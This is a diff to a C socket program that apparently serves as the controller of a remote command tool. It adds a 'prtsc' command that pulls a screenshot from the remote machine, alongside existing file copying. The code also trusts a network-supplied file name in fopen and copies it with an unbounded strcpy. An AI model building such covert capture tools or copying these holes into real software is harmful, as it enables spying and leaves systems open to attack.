@@ -7,10 +7,11 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <stdint.h>
+#include <time.h>
 
 #define BUFFER_SIZE 8192
 
-void receive_file(int client_socket) {
+void receive_file(int client_socket, char *out_filename) {
     uint32_t nameLen;
     uint64_t filesize;
     char filename[1024];
@@ -28,6 +29,10 @@ void receive_file(int client_socket) {
     if (recv(client_socket, &filesize, sizeof(filesize), 0) <= 0) return;
     
     printf("receiving the file: %s (%llu bytes)\n", filename, (unsigned long long)filesize);
+    
+    if (out_filename != NULL) {
+        strcpy(out_filename, filename);
+    }
     
     file = fopen(filename, "wb");
     if (file == NULL) {
@@ -101,9 +106,25 @@ int main()
 			printf("%s", response);
 		}
 		else if (strncmp("copy ", buffer, 5) == 0) {
-			receive_file(client_socket);
+			receive_file(client_socket, NULL);
 			recv(client_socket, response, sizeof(response), 0);
 			printf("%s", response);
+		}
+		else if (strncmp("prtsc", buffer, 5) == 0) {
+			char filename[1024];
+			receive_file(client_socket, filename);
+			recv(client_socket, response, sizeof(response), 0);
+			printf("%s", response);
+			
+			time_t t = time(NULL);
+			struct tm *tm = localtime(&t);
+			char timestamp[64];
+			strftime(timestamp, sizeof(timestamp), "%H-%M-%S", tm);
+			
+			char newname[128];
+			snprintf(newname, sizeof(newname), "%s.png", timestamp);
+			rename(filename, newname);
+			printf("screenshot saved as: %s\n", newname);
 		}
 		else {
 			recv(client_socket, response, sizeof(response), 0);
